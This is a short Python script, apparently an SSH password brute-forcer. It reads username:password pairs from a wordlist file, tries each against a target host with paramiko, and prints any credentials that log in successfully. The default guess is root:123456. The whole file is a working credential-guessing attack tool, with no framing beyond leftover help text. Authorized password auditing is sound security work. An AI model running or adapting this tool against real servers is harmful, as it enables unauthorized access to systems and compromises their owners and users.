import paramiko
import sys
import logging
import click

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
logging.raiseExceptions = False


def checkSSH(host, port, user, pwd):
    try:
        ssh.connect(host, port, user, pwd)
        print(host + ' ' + port + ' ' + user + ' ' + pwd + ' LoginOK')
    except:
        print(f"{user}:{pwd} Login fail")
        pass


@click.command()
@click.option('--type', default="fuzz", help='type')
@click.option('--count', default=20, help='Number of greetings.')
@click.option('--host_port', default="127.0.0.1:22", help='host_port')
@click.option('--user_pass', default="root:123456", help='user_pass')
def main(type, count, host_port, user_pass):
    [host, port] = host_port.strip().split(":")
    [username, password] = user_pass.strip().split(":")
    if type == 'fuzz':
        with open("sshPass.txt", "r") as f:
            for line in f.readlines()[:count]:
                user_pass = line.strip().split(":")
                if len(user_pass) == 2:
                    [username, password] = user_pass
                else:
                    username = user_pass[0]
                    password = ""
                checkSSH(host, port, username, password)
    else:
        checkSSH(host, port, username, password)

if __name__ == '__main__':
    main()